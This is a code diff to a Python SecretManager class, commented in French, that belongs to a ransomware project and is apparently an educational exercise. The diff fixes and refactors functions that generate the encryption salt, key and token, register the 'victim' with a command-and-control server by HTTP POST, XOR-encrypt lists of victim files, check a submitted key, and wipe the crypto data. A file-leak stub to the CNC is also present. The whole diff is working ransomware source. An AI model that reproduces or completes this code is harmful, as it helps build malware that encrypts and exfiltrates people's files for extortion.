@@ -40,19 +40,20 @@ class SecretManager:
             iterations=self.ITERATION,
             backend = default_backend()
         )
-        raise kdf.derive(key) # retoune la clé dérivée
+        return kdf.derive(key) # retoune la clé dérivée
         
 
     def create(self)->Tuple[bytes, bytes, bytes]:
         salt = secrets.token_bytes(self.SALT_LENGTH) # génération d'un sel aléatoire
         key = secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
         token = self.do_derivation(salt, key) # génération du jeton à partir du sel et de la clé
-        raise (salt, key, token) # retourne le sel, la clé et le jeton
+        return (salt, key, token) # retourne le sel, la clé et le jeton
         
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
+
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
@@ -66,33 +67,22 @@ class SecretManager:
         response = requests.post(url, json=data) 
         # vérification du status de la requête
         if response.status_code != 200:
-            self._log.info("Echec de l'envoi")
+            self._log.error(f"Echec de l'envoi : {response.text}")
         else:
             self._log.info("Envoi reussi")
         
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
+        # vérification de l'existence d'un fichier self._token.bin
+        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
+            raise FileExistsError("Les données de chiffrement existent déjà")
 
-        #vérifier l'url du cnc
-        try:
-            url = f"http://{self._remote_host_port}/ping"
-            response = requests.get(url)
-            if response.status_code != 200:
-                raise ConnectionError("URL invalide")
-        except ConnectionError as e:
-            self._log.info("URL invalide")
-            return
-
-        
         # création des données de chiffrement
-        self._salt = os.urandom(self.SALT_LENGTH)
-        self._key = os.urandom(self.KEY_LENGTH)
-        self._token = os.urandom(self.TOKEN_LENGTH)
+        self._salt, self._key, self._token = self.create()
 
         # création du dossier de stockage des données de chiffrement
-        if not os.path.exists(self._path):
-            os.makedirs(self._path)
+        os.makedirs(self._path, exist_ok=True)
 
         # sauvegarde des données de chiffrement dans des fichiers
         with open(os.path.join(self._path, "salt.bin"), "wb") as salt_f:
@@ -125,12 +115,8 @@ class SecretManager:
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
         # vérification de la clé
-        if self._salt is None or self._token is None:
-            self._log.info("Les données de chiffrement n'existent pas")
-            return False
-        else:
-            # génération du jeton à partir du sel et de la clé candidate
-            derived_key = self.do_derivation(self._salt, candidate_key)
+        # génération du jeton à partir du sel et de la clé candidate
+        derived_key = self.do_derivation(self._salt, candidate_key)
         return derived_key == self._token
 
 
@@ -143,42 +129,60 @@ class SecretManager:
             self._key = test_key
             self._log.info("Clé valide")
         else:
-            self._log.info("Clé invalide")
+            raise ValueError("Clé invalide")
         
 
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
         #Hacher le token en sha256 et le convertir en hexadécimal
         hashed_token = sha256(self._token).hexdigest()
-        raise hashed_token
+        return hashed_token
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
+        self._log.info(files)
         for f_path in files:
             try:
                 xorfile(f_path, self._key)
+                self._log.info(f"Chiffrement de {f_path} réussi")
             except Exception as erreur:
                 self._log.error(f"Erreur pednant le chiffrement {f_path}: {erreur}")
 
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        return NotImplemented()
 
 
     def clean(self):
         # remove crypto data from the target
-        try:
-            # suppression des données de chiffrement
-            salt_path = os.path.join(self._path, "salt.bin")
-            token_path = os.path.join(self._path, "token.bin")
+        # suppression des données de chiffrement
+        salt_path = os.path.join(self._path, "salt.bin")
+        token_path = os.path.join(self._path, "token.bin")
 
+        try:  
             # suppression du fichier de sel s'il existe
             if os.path.exists(salt_path):
                 os.remove(salt_path) 
+                self._log.info("Fichier de sel supprimé")
+            else:
+                self._log.info("Fichier de sel inexistant")
+        
+        except Exception as erreur:
+            self._log.error(f"Erreur pendant la suppression du fichier de sel: {erreur}")
+            
+        try:
             # suppression du fichier de jeton s'il existe
             if os.path.exists(token_path):
                 os.remove(token_path)
-            
+                self._log.info("Fichier de jeton supprimé")
+            else:
+                self._log.info("Fichier de jeton inexistant")
+    
         except Exception as erreur:
-            self._log.error(f"Erreur pendant le nettoyage: {erreur}") # retourne l'erreur
+            self._log.error(f"Erreur pendant la suppression du fichier de jeton: {erreur}")
+            
+        # clear in memory data
+        self._salt = None
+        self._key = None
+        self._token = None
